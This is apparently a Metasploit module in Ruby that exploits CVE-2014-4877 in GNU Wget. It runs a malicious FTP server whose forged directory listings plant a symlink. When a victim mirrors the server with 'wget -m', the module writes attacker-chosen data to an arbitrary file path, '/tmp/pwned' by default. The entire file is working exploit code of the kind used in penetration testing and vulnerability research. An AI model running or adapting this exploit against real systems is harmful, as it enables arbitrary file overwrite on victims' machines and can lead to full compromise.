# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::FtpServer
include Msf::Auxiliary::Report
def initialize
super(
&#039;Name&#039; => &#039;GNU Wget FTP Symlink Arbitrary Filesystem Access&#039;,
&#039;Description&#039; => %q{
This module exploits a vulnerability in Wget when used in
recursive (-r) mode with a FTP server as a destination. A
symlink is used to allow arbitrary writes to the target&#039;s
filesystem. To specify content for the file, use the
"file:/path" syntax for the TARGET_DATA option.
Tested successfully with wget 1.14. Versions prior to 1.16
},
&#039;Author&#039; => [&#039;hdm&#039;],
&#039;License&#039; => MSF_LICENSE,
&#039;Actions&#039; => [[&#039;Service&#039;]],
&#039;PassiveActions&#039; => [&#039;Service&#039;],
&#039;References&#039; =>
[
[ &#039;CVE&#039;, &#039;2014-4877&#039;],
[ &#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=1139181&#039; ],
[ &#039;URL&#039;, &#039;https://community.rapid7.com/community/metasploit/blog/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access&#039; ]
],
&#039;DefaultAction&#039; => &#039;Service&#039;,
&#039;DisclosureDate&#039; => &#039;Oct 27 2014&#039;
)
register_options(
[
OptString.new(&#039;TARGET_FILE&#039;, [ true, "The target file to overwrite", &#039;/tmp/pwned&#039; ]),
OptString.new(&#039;TARGET_DATA&#039;, [ true, "The data to write to the target file", &#039;Hello from Metasploit&#039; ]),
OptPort.new(&#039;SRVPORT&#039;, [ true, "The port for the malicious FTP server to listen on", 2121])
], self.class)
@fakedir = Rex::Text.rand_text_alphanumeric(rand(8)+8)
end
def run
my_address = Rex::Socket.source_address
print_good("Targets should run: $ wget -m ftp://#{my_address}:#{datastore[&#039;SRVPORT&#039;]}/")
exploit()
end
def on_client_command_user(c,arg)
@state[c][:user] = arg
c.put "331 User name okay, need password...\r\n"
end
def on_client_command_pass(c,arg)
@state[c][:pass] = arg
c.put "230 Login OK\r\n"
@state[c][:auth] = true
print_status("#{@state[c][:name]} Logged in with user &#039;#{@state[c][:user]}&#039; and password &#039;#{@state[c][:user]}&#039;...")
end
def on_client_command_retr(c,arg)
print_status("#{@state[c][:name]} -> RETR #{arg}")
if not @state[c][:auth]
c.put "500 Access denied\r\n"
return
end
unless arg.index(::File.basename(datastore[&#039;TARGET_FILE&#039;]))
c.put "550 File does not exist\r\n"
return
end
conn = establish_data_connection(c)
if not conn
c.put("425 Can&#039;t build data connection\r\n")
return
end
c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
conn.put(datastore[&#039;TARGET_DATA&#039;])
c.put("226 Transfer complete.\r\n")
conn.close
print_good("#{@state[c][:name]} Hopefully wrote #{datastore[&#039;TARGET_DATA&#039;].length} bytes to #{datastore[&#039;TARGET_FILE&#039;]}")
end
def on_client_command_list(c,arg)
print_status("#{@state[c][:name]} -> LIST #{arg}")
if not @state[c][:auth]
c.put "500 Access denied\r\n"
return
end
conn = establish_data_connection(c)
if not conn
c.put("425 Can&#039;t build data connection\r\n")
return
end
pwd = @state[c][:cwd]
buf = &#039;&#039;
dstamp = Time.at(Time.now.to_i-((3600*24*365)+(3600*24*(rand(365)+1)))).strftime("%b %e %Y")
unless pwd.index(@fakedir)
buf << "lrwxrwxrwx 1 root root 33 #{dstamp} #{@fakedir} -> #{::File.dirname(datastore[&#039;TARGET_FILE&#039;])}\r\n"
buf << "drwxrwxr-x 15 root root 4096 #{dstamp} #{@fakedir}\r\n"
else
buf << "-rwx------ 1 root root #{"%9d" % datastore[&#039;TARGET_DATA&#039;].length} #{dstamp} #{::File.basename(datastore[&#039;TARGET_FILE&#039;])}\r\n"
end
c.put("150 Opening ASCII mode data connection for /bin/ls\r\n")
conn.put("total #{buf.length}\r\n" + buf)
c.put("226 Transfer complete.\r\n")
conn.close
end
def on_client_command_size(c,arg)
if not @state[c][:auth]
c.put "500 Access denied\r\n"
return
end
c.put("213 #{datastore[&#039;TARGET_DATA&#039;].length}\r\n")
end
def on_client_command_cwd(c,arg)
print_status("#{@state[c][:name]} -> CWD #{arg}")
if not @state[c][:auth]
c.put "500 Access denied\r\n"
return
end
upath = "/"
npath = ::File.join(@state[c][:cwd], arg)
bpath = npath[upath.length, npath.length - upath.length]
# Check for traversal above the root directory
if not (npath[0, upath.length] == upath or bpath == &#039;&#039;)
bpath = &#039;/&#039;
end
bpath = &#039;/&#039; if bpath == &#039;&#039;
@state[c][:cwd] = bpath
c.put "250 CWD command successful.\r\n"
end
end

